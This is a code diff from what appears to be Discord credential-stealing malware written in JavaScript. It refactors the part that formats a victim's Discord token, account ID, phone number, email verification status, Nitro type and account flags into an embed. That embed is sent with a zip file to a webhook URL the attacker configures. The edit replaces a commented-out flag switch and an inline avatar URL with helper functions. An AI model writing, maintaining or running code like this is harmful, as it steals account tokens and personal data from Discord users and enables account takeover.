@@ -9,7 +9,7 @@ const { tempFolder } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
-const { nitroSubscriptionType, billingType } = require('../util/discord-account');
+const { nitroSubscriptionType, billingType, accountFlags, avatarURL } = require('../util/discord-account');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
@@ -45,7 +45,7 @@ const json = async (zipFile) => {
     description: `Token: \`\`\`\n${account.token}\n\`\`\``,
     author: {
       name: `${account.username}#${account.discriminator}`,
-      icon_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.${account.avatar.startsWith('a_') ? 'gif' : 'png'}`
+      icon_url: avatarURL(account.id, account.avatar)
     },
     fields: [
       ['ID', account.id],
@@ -57,40 +57,7 @@ const json = async (zipFile) => {
       ['Email Verified', account.verified],
       ['Phone Number', account.phone || 'No Phone Number'],
       ['Nitro Subscription', nitroSubscriptionType(account.premium_type)],
-      /*['Flags', (() => { let flags = []; switch (account.flags) {
-        case 1 << 0:
-          flags.push('Staff'); break;
-        case 1 << 1:
-          flags.push('Partner'); break;
-        case 1 << 2:
-          flags.push('HypeSquad'); break;
-        case 1 << 3:
-          flags.push('Bug Hunter (Level 1)'); break;
-        case 1 << 6:
-          flags.push('HypeSquad (House 1)'); break;
-        case 1 << 7:
-          flags.push('HypeSquad (House 2)'); break;
-        case 1 << 8:
-          flags.push('HypeSquad (House 3)'); break;
-        case 1 << 9:
-          flags.push('Early Supporter'); break;
-        case 1 << 10:
-          flags.push('Team User'); break;
-        case 1 << 14:
-          flags.push('Bug Hunter (Level 2)'); break;
-        case 1 << 16:
-          flags.push('Verified Bot'); break;
-        case 1 << 17:
-          flags.push('Verified Developer'); break;
-        case 1 << 18:
-          flags.push('Certified Moderator'); break;
-        case 1 << 19:
-          flags.push('Bot HTTP Interactions'); break;
-        case 1 << 22:
-          flags.push('Active Developer'); break;
-        default:
-          return 'No Flags';
-      } return flags.join(', '); })()],*/
+      ['Flags', accountFlags(account.flags)],
     ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
     color: account.accent_color,
   }); });
